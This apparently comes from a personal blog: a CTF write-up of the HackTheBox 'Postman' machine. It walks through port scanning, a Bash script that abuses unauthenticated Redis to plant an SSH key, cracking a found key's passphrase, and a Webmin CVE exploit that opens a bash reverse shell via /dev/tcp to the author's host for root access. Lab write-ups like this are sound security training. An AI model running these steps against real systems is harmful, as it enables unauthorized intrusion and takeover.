---
title: "HackTheBox: Postman Writeup"
date: 2020-03-13 17:06:00
tags: ["HackTheBox", "CTF", "Writeup", "Redis", "Pentesting", "Linux", "CVE", "Webmin"]
description: "Writeup for the Postman machine at HackTheBox."
images: []
---

[Postman](https://www.hackthebox.eu/home/machines/profile/215) is a vulnerable Linux machine hosted over at [HackTheBox](https://www.hackthebox.eu/) with a difficulty rating of 4.4 out of 10. It runs a Redis instance with lack of authentication which can be used to chuck SSH keys onto the machine. Another private SSH key hides in the guts of the file system. Its passphrase can then be used to obtain user privileges and, through a CVE, privilege escalation to root.

<!--more-->

### Enumeration

The initial portscan reveals two webservers, one running on port 80 and one on port 10000. There is also a Redis instance running on port 6379.

```text
kali@kali:~$ sudo masscan -p1-65535,u:1-65535 10.10.10.160 --rate=1000 -e tun0

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-13 15:33:46 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.160                                    
Discovered open port 10000/tcp on 10.10.10.160                                 
Discovered open port 6379/tcp on 10.10.10.160                                  
kali@kali:~$ sudo nmap -sV -p80,6379,10000 postman.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 11:37 EDT
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.066s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
6379/tcp  open  redis   Redis key-value store 4.0.9 
10000/tcp open  http    MiniServ 1.910 (Webmin httpd) 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 37.61 seconds
```

I added an entry to my hosts file before checking out both webservers. Port 80 shows a normal portfolio. A dirbust doesn't reveal much other than directories for serving static content for the website. The webserver on port 10000 is not accessible without explicitly switching the transport protocol to HTTPS. So after browsing `https://postman.htb:10000` instead, I find the login mask of [Webmin](http://www.webmin.com/) &mdash; a remote configuration interface for Unix systems.

{{< figure src="/images/htb/postman/webmin.png" alt="Screenshot of Webmin login panel" caption="Webmin login panel" >}}

There are two useful CVEs filed for Webmin. [CVE-2019-12840](https://www.exploit-db.com/exploits/46984) allows authenticated remote code execution so this might be useful at a later time. [CVE-2019-15107](https://www.exploit-db.com/exploits/47230) allows unauthenticated remote code execution, but this particular Webmin instance turned out to not be vulnerable to that exploit.

Lastly, I checked out the Redis instance. As it turns out, it is completely unprotected.

```text
kali@kali:~$ redis-cli -h postman.htb                                 
postman.htb:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
```

### Dumping SSH keys with Redis

A [blog article](http://antirez.com/news/96) by the author of Redis themselves on the security of Redis describes a method of putting SSH keys onto a remote server using Redis. Here's a quick rundown of the attack.

1. Create a new SSH keypair on local machine.
2. Connect to Redis instance and configure to save the Redis dataset to the `authorized_keys` file in the SSH directory of the Redis user.
3. Set value of an arbitrary database key to the content of the newly created public key file.
4. Run `SAVE` command on Redis instance to dump the dataset to the previously configured file.

```text
kali@kali:~/HTB/machines/postman$ ssh-keygen -t rsa -C "redis@postman.htb"
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:UiOInDEEpdfzJfzVH8zgttqUeGwZt29uz8qQqmsMSwQ redis@postman.htb
The key's randomart image is:
+---[RSA 3072]----+
|.+=         .    |
| o *Eo     o +   |
|. = +.+ + . = =  |
| .   o.* o + B o |
|     .o S . O o  |
|      o.   * . . |
|     . +  . +   o|
|      . o  . o +.|
|       .oo.   oo=|
+----[SHA256]-----+
```

Then it is as trivial as connecting to the machine via SSH with the generated private key. Since multiple users tried to dump their SSH keys in the same way, I wrote a short Bash script to pull off the steps on the Redis instance in quick succession.


```bash
#!/usr/bin/bash

host=$1
file=$2

redis-cli -h $host slaveof no one
redis-cli -h $host flushall
redis-cli -h $host config set dir /var/lib/redis/.ssh
redis-cli -h $host config set dbfilename authorized_keys
redis-cli -h $host set rbk "$(cat $file)"
redis-cli -h $host save
```

The script is executed with two command line parameters. The first parameter is used to specify the address of the unprotected Redis instance. The second parameter specifies the path to the public key file. All commands follow the attack described above with one exception: `SLAVEOF NO ONE`. There exists [another common vulnerability](https://www.exploit-db.com/exploits/47195) allowing unauthenticated code execution by using Redis's built in master-slave replication feature. However, the premade exploits that can be found would change the Redis instance into a read-only slave without leveraging the vulnerability. Using `SLAVEOF NO ONE` would change the read-only slave back into a read-write master.

So much for this intermission. I ran the script in one tab and waited for it to complete so I could SSH into the machine in another tab.

```text
kali@kali:~/HTB/machines/postman$ ssh -i id_rsa redis@postman.htb
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
...
Last login: Fri Mar 13 15:58:42 2020 from 10.10.15.150
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ pwd
/var/lib/redis
```

The result is a low-privilege shell which allowed me to dig deeper into the machine. During enumeration, I found a user account called `Matt` and a rogue SSH key in the `/opt` directory.

```text
redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghf...
-----END RSA PRIVATE KEY-----
```

John found the corresponding passphrase `computer2008` for the SSH key within a couple of seconds. 

```text
kali@kali:~/HTB/machines/postman$ /usr/share/john/ssh2john.py matt_id > matt_id.hash
kali@kali:~/HTB/machines/postman$ john --format=ssh matt_id.hash --wordlist=~/rockyou.txt --rules
```

Using the private key to SSH into the machine wouldn't work though. The SSH server is configured to not allow any login attempts from `Matt`, so I checked for other places that would allow me to use the same combination of username and password. All it took was a simple `su`.

```text
redis@Postman:~$ su Matt
Password: (computer2008)
Matt@Postman:/var/lib/redis$ cd /home/Matt
Matt@Postman:~$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:~$ cat user.txt
517ad###########################
```

### Authenticated remote code execution

Now that I had a username and a corresponding password, I could come back to the Webmin interface and attempt to exploit the CVE I found earlier. I could use the same credentials to log in which meant that, in theory, the exploit should work.

The exploit for the relevant CVE is written as a Metasploit module. Not being the biggest Metasploit fan myself, I rewrote it in Python. You can look at it in my [CTF snippet repository](https://github.com/JoogsWasTaken/ctf-snippets/tree/master/HTB/Postman) although the code itself is unremarkable. It's just a port of the already existing port to another programming language.

To verify that the exploit works, I ran a ping back to my local machine.

```text
kali@kali:~/HTB/machines/postman$ python3 cve-2019-12840.py https://10.10.10.160:10000 Matt computer2008 "ping -c 4 10.10.##.##"
```
The script takes four arguments: the address of the vulnerable Webmin instance, the username and password, and finally the command to be executed. I captured the pings back to my machine, so my next step was to obtain a reverse shell. Getting a particular reverse shell to work was more or less trial and error. Bash turned out to be perfectly capable of doing just that.

```text
kali@kali:~/HTB/machines/postman/writeup$ python cve-2019-12840.py https://10.10.10.160:10000 Matt computer2008 "bash -i >& /dev/tcp/10.10.##.##/4242 0>&1"
```

```text
kali@kali:~$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.##.##] from (UNKNOWN) [10.10.10.160] 46086
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
root@Postman:/usr/share/webmin/package-updates/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Postman:/usr/share/webmin/package-updates/# cd       
cd
root@Postman:~# cat root.txt
cat root.txt
a2577###########################
```

And just like that, I've become root.

### Conclusion

In hindsight, this box definitely deserves its easy rating despite its calculated difficulty of 4.4. There were no great hindrances except the ones caused by many people trying to solve this box at the same time. Funnily enough, I ended up getting the root flag before I got the user flag because I didn't think of `su` before attempting to use the credentials I found in conjunction with the CVE. I also had trouble finding the Redis instance until I adopted `masscan` into my pentesting workflow, and it turned out to be a massive timesaver. Thanks to [TheCyberGeek](https://www.hackthebox.eu/home/users/profile/114053) for this box and thanks to anyone else who kept nudging me until I finally found the Redis instance. From there on out, it was very straightforward.